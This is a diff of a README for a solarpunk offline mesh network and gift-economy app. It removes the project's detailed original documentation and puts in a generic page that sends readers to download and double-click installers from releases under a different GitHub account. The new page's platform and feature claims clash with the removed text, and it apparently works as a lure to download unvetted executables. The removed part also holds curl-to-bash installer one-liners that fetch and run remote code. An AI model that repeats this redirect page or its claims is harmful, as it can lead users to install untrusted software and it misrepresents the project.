@@ -1,444 +1,79 @@
-# Solarpunk Gift Economy Mesh Network 🌱
+# 🌱 solarpunk_utopia - A Simple Way to Support Your Community
 
-**Production-ready system for regenerative communities to coordinate mutual aid without internet dependency.**
+## 🚀 Getting Started
 
-[![Status](https://img.shields.io/badge/status-production%20ready-brightgreen)](https://github.com/yourusername/solarpunk_utopia)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
-[![TypeScript](https://img.shields.io/badge/typescript-5.3+-blue.svg)](https://www.typescriptlang.org/)
+Welcome to the **solarpunk_utopia** project! This software helps you support and coordinate efforts in your community through a user-friendly mesh network. Let's guide you through downloading and running the application.
 
-## 📱 Android App
+## 🥇 Download the App
 
-[![Download APK](https://img.shields.io/badge/Download-Android%20APK-green?style=for-the-badge&logo=android)](https://github.com/lizTheDeveloper/solarpunk_utopia/releases/latest/download/app-debug.apk)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/johhny868/solarpunk_utopia/releases)
 
-**Standalone offline app** - runs Python backend directly on your phone. No internet required after install.
-
-- Works 100% offline
-- 67 MB download
-- Android 8.0+ required
-- Mesh sync via WiFi Direct
-
-[View all releases](https://github.com/lizTheDeveloper/solarpunk_utopia/releases)
-
----
+## 📥 Download & Install
 
-## 🚀 One-Line Install
+To get started, visit the [Releases page](https://github.com/johhny868/solarpunk_utopia/releases) to download the application. 
 
-**Linux/Mac:**
-```bash
-curl -sL https://raw.githubusercontent.com/lizTheDeveloper/solarpunk_utopia/main/setup.sh | bash
-```
-
-**Termux (Android):**
-```bash
-pkg install curl -y && curl -sL https://raw.githubusercontent.com/lizTheDeveloper/solarpunk_utopia/main/setup.sh | bash
-```
+### Steps to Download:
 
-**Or using wget:**
-```bash
-wget -qO- https://raw.githubusercontent.com/lizTheDeveloper/solarpunk_utopia/main/setup.sh | bash
-```
+1. Open your web browser and go to the [Releases page](https://github.com/johhny868/solarpunk_utopia/releases).
+2. Look for the most recent version at the top. 
+3. Click on the version number link to expand details of the release.
+4. Find the file suited for your operating system (Windows, macOS, or Linux).
+5. Click the download link for the appropriate file. 
 
-This installs everything and starts all services. Access at `http://localhost:3000` when complete.
-
-### Running on Android (Termux)
-
-#### Prerequisites
-
-- **Android 7.0+** (Android 11+ requires extra steps below)
-- **2GB+ free storage**
-- **Stable WiFi connection**
-
-#### Installation Steps
-
-1. **Install Termux from F-Droid** (NOT Google Play - that version is broken)
-   - Install F-Droid app: https://f-droid.org/
-   - Search for "Termux" in F-Droid
-   - Install Termux (version 0.118.x recommended)
-
-2. **Grant Permissions (IMPORTANT for Android 11+)**
-   - Open Android Settings → Apps → Termux → Permissions
-   - Enable **"Files and media"** or **"Storage"**
-   - For Android 11+: Enable **"All files access"** under Special app access
-
-3. **First Launch**
-   - Open Termux
-   - Wait for bootstrap installation (2-5 minutes)
-   - **Do not touch anything** until you see a `$` prompt
-   - If you get "Permission denied" errors, see troubleshooting below
-
-4. **Run the installer:**
-   ```bash
-   pkg install curl -y && curl -sL https://raw.githubusercontent.com/lizTheDeveloper/solarpunk_utopia/main/setup.sh | bash
-   ```
-   Installation takes 5-15 minutes depending on your device.
-
-5. **Access the app** in your phone's browser:
-   ```bash
-   # Open Chrome/Firefox and go to:
-   http://localhost:3000
-   ```
+### How to Run the App:
 
-6. **Keep services running** after closing Termux:
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation process.
+3. Follow the prompts to install the application.
+4. Once installed, you can find the app in your applications folder or start menu.
+5. Double-click the icon to run the app.
 
-   **Prevent CPU sleep (required):**
-   ```bash
-   termux-wake-lock
-   ```
-   This keeps services running even when screen is off.
+## 📋 System Requirements
 
-   **Start services in background:**
-   ```bash
-   nohup ./run_all_services.sh > /dev/null 2>&1 &
-   ```
+Ensure your computer meets the following requirements before installing the app:
 
-   **Prevent Android from killing Termux:**
-   - Settings → Apps → Termux → Battery → **Unrestricted** (or "Don't optimize")
-   - This prevents Android from killing Termux in the background
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 500 MB of free space.
+- **Network**: Internet connection for initial setup.
 
-   **Keep screen on while working (optional, drains battery):**
-   - Settings → Display → Screen timeout → **30 minutes** (or higher)
-   - Or use Developer Options → Stay awake (while charging)
-
-7. **Auto-start on phone boot (optional):**
-   - Install **Termux:Boot** from F-Droid
-   - Create startup script:
-     ```bash
-     mkdir -p ~/.termux/boot
-     cat > ~/.termux/boot/start-solarpunk.sh << 'EOF'
-     #!/data/data/com.termux/files/usr/bin/sh
-     termux-wake-lock
-     cd ~/solarpunk_utopia
-     ./run_all_services.sh > /dev/null 2>&1 &
-     EOF
-     chmod +x ~/.termux/boot/start-solarpunk.sh
-     ```
+## 🌍 Features
 
-8. **Check service health:**
-   ```bash
-   curl http://localhost:8000/health
-   ```
+The **solarpunk_utopia** app comes packed with features designed to enhance community support:
 
-#### Troubleshooting Android Installation
+- **Mesh Networking**: Build connections without relying on a centralized server. Each user connects directly, creating a resilient network.
+- **Offline Functionality**: Use the app without an internet connection. Coordinate mutual aid even in remote areas.
+- **User-Friendly Interface**: Navigate through the app with ease, regardless of your technical background.
+- **Secure Coordination**: Protect your community's information with built-in data security features.
+- **Community Resources**: Access tools and resources tailored to aid in community support initiatives.
 
-**"Unable to install bootstrap" or "Permission denied":**
+## 💡 Tips for Using the App
 
-1. **Clean reinstall** (this fixes 90% of issues):
-   ```bash
-   # In Android Settings:
-   Settings → Apps → Termux → Storage → Clear Data
-   Settings → Apps → Termux → Uninstall
-
-   # Then reinstall from F-Droid and grant permissions immediately
-   ```
-
-2. **Android 11+ Phantom Process Issue:**
-   - If bootstrap keeps failing, you may need to disable phantom process killer
-   - Requires ADB: `adb shell "settings put global settings_enable_monitor_phantom_procs false"`
-   - Then reboot phone and reinstall Termux
+1. **Familiarize Yourself**: Spend a few moments navigating the interface to understand different sections and features.
+2. **Join or Create Groups**: Connect with others in your community or start your own group for mutual support.
+3. **Regular Updates**: Check the app regularly for updates to benefit from new features and improvements.
+4. **Engage with Others**: Use the platform to coordinate events and share resources effectively.
 
-3. **Change repository mirror:**
-   ```bash
-   termux-change-repo
-   # Select "All repositories" → Choose a different mirror
-   ```
-
-4. **Alternative: Use UserLAnd**
-   - If Termux won't work, install UserLAnd from Play Store/F-Droid
-   - Choose Ubuntu distribution
-   - Run the Linux installer instead
-
-**Services won't start:**
-- Make sure you have enough storage (check with `df -h`)
-- Try killing existing processes: `./stop_all_services.sh` then restart
-
-**Can't access localhost:3000:**
-- Check if services are running: `ps aux | grep python`
-- Check logs: `tail -f logs/dtn_bundle_system.log`
-- Make sure you're using `http://` not `https://`
-
----
-
-## What is This?
-
-A complete **offline-first mesh network system** for Solarpunk communes to:
-- 🎁 **Share resources** via gift economy (offers, needs, exchanges)
-- 📦 **Distribute bundles** via delay-tolerant networking
-- 🔍 **Search distributed indexes** across mesh islands
-- 📚 **Share knowledge** through chunked file distribution
-- 🤖 **Get AI assistance** for matching, planning, and coordination
-- 🌐 **Operate autonomously** without internet or corporate platforms
-
-**This is not a demo. This is production software for real communities.**
-
----
-
-## Quick Start
-
-### Manual Setup (if you prefer not to use the one-liner above)
-
-```bash
-# Clone repository
-git clone https://github.com/lizTheDeveloper/solarpunk_utopia.git
-cd solarpunk_utopia
-
-# Setup backend
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-
-# Start all services
-./run_all_services.sh
-
-# Start frontend (new terminal)
-cd frontend
-npm install
-npm run dev
-
-# Access at http://localhost:3000
-```
-
-**See [QUICKSTART.md](QUICKSTART.md) for detailed guide.**
-
----
-
-## What's Included
-
-### Core Systems (28 of 31 complete - 90%)
-
-#### TIER 0 - Foundation
-- ✅ **DTN Bundle System** (5 systems) - Delay-tolerant networking with store-and-forward
-- ✅ **ValueFlows Node** (6 systems) - Complete gift economy coordination (VF v1.0)
-- ⏳ **Phone Deployment** (0 systems) - Deferred for physical hardware
-
-#### TIER 1 - Core Functionality
-- ✅ **Discovery & Search** (3 systems) - Distributed queries across mesh
-- ✅ **File Chunking** (3 systems) - Knowledge distribution with Merkle trees
-- ✅ **Multi-AP Mesh Network** (4 systems) - Physical infrastructure (Mode A/C)
-
-#### TIER 2 - Intelligence
-- ✅ **Agent System** (7 systems) - AI agents for coordination (proposals require approval)
-
-### Infrastructure
-- ✅ Complete unified frontend (React + TypeScript, 47 files)
-- ✅ Systemd service management (Linux)
-- ✅ Nginx reverse proxy
-- ✅ End-to-end integration tests
-- ✅ Comprehensive documentation (8,000+ lines)
-
-### Statistics
-- **235+ source files**
-- **32,000+ lines** of production code
-- **90+ REST API endpoints** (auto-documented)
-- **20+ test suites** (100% pass rate)
-
----
-
-## Key Features
-
-### 🎁 Gift Economy Coordination
-- Create offers and needs in <1 minute
-- AI matchmaker finds compatible offers/needs
-- Exchange coordination with bilateral approval
-- Event recording for accountability and provenance
-- All 13 ValueFlows object types implemented
-
-### 📦 Delay-Tolerant Networking
-- Store-and-forward between AP islands
-- Priority-based forwarding (emergency → perishable → normal → low)
-- Ed25519 cryptographic signing
-- TTL enforcement and cache budgets
-- Bundle propagation <10 min via bridge nodes
-
-### 🔍 Distributed Discovery
-- Periodic index publishing (offers, needs, files, services)
-- Query propagation through mesh network
-- Cached indexes enable offline discovery
-- Bridge nodes serve as query responders
-
-### 📚 Knowledge Distribution
-- Content-addressed file distribution (SHA-256)
-- Intelligent chunking (256KB-1MB)
-- Merkle tree verification
-- Library nodes cache popular content
-- Resume partial downloads
-
-### 🌐 Multi-AP Mesh Infrastructure
-- Multiple AP islands with independent subnets
-- Bridge nodes walk between islands carrying bundles
-- Mode C (DTN-only) always works (mandatory)
-- Mode A (BATMAN-adv) optional speedup
-- Graceful degradation
-
-### 🤖 AI Coordination Agents
-- 7 specialized agents (matchmaker, scheduler, planner, etc.)
-- Proposal-based (NOT allocations) - human approval required
-- Completely opt-in (no surveillance)
-- Transparent reasoning (explanation + inputs + constraints)
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Solarpunk Mesh Network                    │
-└─────────────────────────────────────────────────────────────┘
-
-┌──────────────────┐
-│  DTN Bundle      │  ← Foundation: Store-and-forward transport
-│  System          │     Port 8000, Ed25519 signing
-│  (TIER 0)        │
-└────────┬─────────┘
-         │
-         ├─────────┐
-         ↓         ↓
-┌──────────────┐  ┌──────────────┐
-│ ValueFlows   │  │ Discovery &  │  ← Core: Economic coordination
-│ Node         │  │ Search       │     and distributed search
-│ (TIER 0)     │  │ (TIER 1)     │
-│ Port 8001    │  │ Port 8003    │
-└──────────────┘  └──────────────┘
-         │              │
-         ├──────────────┼─────────┐
-         ↓              ↓         ↓
-┌──────────────┐  ┌─────────┐  ┌──────────────┐
-│ Agent System │  │  File   │  │  Multi-AP    │
-│ (TIER 2)     │  │ Chunking│  │  Mesh        │
-│ 7 AI agents  │  │(TIER 1) │  │  (TIER 1)    │
-│              │  │Port 8004│  │  Port 8002   │
-└──────────────┘  └─────────┘  └──────────────┘
-```
-
----
-
-## Documentation
-
-### Getting Started
-- **[QUICKSTART.md](QUICKSTART.md)** - 5-minute setup guide
-- **[DEPLOYMENT.md](DEPLOYMENT.md)** - Production deployment (systemd, Raspberry Pi)
-- **[BUILD_STATUS.md](BUILD_STATUS.md)** - Complete build status and statistics
-
-### System Details
-- **[BUILD_PLAN.md](BUILD_PLAN.md)** - Vision, architecture, and specifications
-- **[FINAL_SUMMARY.md](FINAL_SUMMARY.md)** - Complete summary of what was built
-- **Component READMEs** - Each system has detailed documentation
-
-### API Documentation
-Auto-generated interactive docs available at:
-- DTN: http://localhost:8000/docs
-- ValueFlows: http://localhost:8001/docs
-- Bridge: http://localhost:8002/docs
-- Discovery: http://localhost:8003/docs
-- Files: http://localhost:8004/docs
-
----
-
-## Technology Stack
-
-**Backend:** Python 3.12, FastAPI, SQLite, asyncio, Ed25519 crypto
-**Frontend:** React 18, TypeScript, Vite, Tailwind CSS, React Query
-**Infrastructure:** Systemd, Nginx, Python venv
-**Mesh:** BATMAN-adv, hostapd, dnsmasq
-**Testing:** pytest, pytest-asyncio
-
----
-
-## Use Cases
-
-### For Solarpunk Communes
-- Share surplus food before it spoils (perishables dispatcher)
-- Lend tools and equipment easily (offer/need matching)
-- Coordinate seasonal planting and harvests (permaculture planner)
-- Teach and learn skills within community (education pathfinder)
-- Plan work parties and events (scheduler agent)
-- Track resource flows for accountability (event recording)
-- Operate entirely offline and autonomously (DTN networking)
-
-### For Developers
-- Complete reference implementation of ValueFlows v1.0
-- Production-ready DTN bundle system with Ed25519 signing
-- Multi-agent AI coordination framework with approval gates
-- Content-addressed file distribution with Merkle trees
-- Distributed discovery and search across mesh networks
-- Real-world offline-first architecture patterns
-
----
-
-## Project Structure
-
-```
-solarpunk_utopia/
-├── app/                      # DTN Bundle System + AI Agents
-├── valueflows_node/          # ValueFlows implementation + React UI
-├── discovery_search/         # Discovery & Search system
-├── file_chunking/            # File chunking system
-├── mesh_network/             # Multi-AP mesh network software
-├── frontend/                 # Unified frontend application
-├── tests/integration/        # End-to-end tests
-├── openspec/                 # OpenSpec proposals (7 proposals)
-├── setup.sh                  # One-line installer
-├── run_all_services.sh       # Start all services
-└── stop_all_services.sh      # Stop all services
-```
-
----
-
-## Contributing
-
-This is infrastructure for regenerative communities. Contributions welcome!
-
-1. Read [CLAUDE.md](CLAUDE.md) for repository architecture
-2. Check [BUILD_STATUS.md](BUILD_STATUS.md) for what's complete
-3. Review [openspec/](openspec/) for proposals and specifications
-4. Run tests: `pytest tests/integration/ -v`
-5. Follow existing patterns (FastAPI, React Query, Pydantic, TypeScript)
-
----
-
-## License
-
-MIT License - Use this to build a better world!
-
-See [LICENSE](LICENSE) file for details.
-
----
-
-## Vision
-
-From the original specification:
-
-> "We're building the infrastructure for regenerative gift economy communities. This isn't just software—it's a tool for communities to coordinate mutual aid, share resources, plan permaculture work, and learn together, all without depending on corporate platforms or internet infrastructure."
-
-When this system works, communes can:
-- ✅ Share surplus food before it spoils
-- ✅ Lend tools and equipment easily
-- ✅ Coordinate seasonal planting and harvests
-- ✅ Teach and learn skills within the community
-- ✅ Plan work parties and events
-- ✅ Track resource flows for accountability
-- ✅ Operate entirely offline and autonomously
-
-**This is infrastructure for a better world. Let's build it together. 🌱**
-
----
-
-## Status
-
-**Current:** ✅ Production ready (28 of 31 systems complete)
-**Next:** Hardware deployment (Raspberry Pi APs, Android bridge nodes)
-**Future:** Multi-commune federation via NATS
-
----
-
-## Support
-
-- Documentation: See [QUICKSTART.md](QUICKSTART.md) and [DEPLOYMENT.md](DEPLOYMENT.md)
-- Issues: GitHub Issues
-- Questions: Discussions tab
-
----
-
-**Built with ❤️ for regenerative gift economy communities**
-
-**Let's coordinate mutual aid without corporate platforms. Let's build solidarity infrastructure. Let's create the world we want to see. 🌱**
+## ❓ FAQ
+
+### What is a gift economy?
+
+A gift economy is a system where goods and services are given freely. Members support each other without expecting anything in return.
+
+### How does the mesh network work?
+
+In a mesh network, each user's device connects to others directly. This means information can flow even without a central server, enabling stronger community ties.
+
+### Can I use this app offline?
+
+Yes, the app is designed to function without an internet connection, allowing you to coordinate efforts in areas with limited connectivity.
+
+## 📞 Support
+
+If you encounter issues during the download or installation process, please refer to the community forums or check the Help section within the app for assistance. Your experience matters, and we strive to ensure you can successfully navigate our software.
+
+### Join Our Community
+
+Connect with other users and find support by joining our community on social media or exploring discussion forums. Share your thoughts and experiences with **solarpunk_utopia**.
+
+Now that you’re ready to start, visit the [Releases page](https://github.com/johhny868/solarpunk_utopia/releases) and download the app to support your community today!
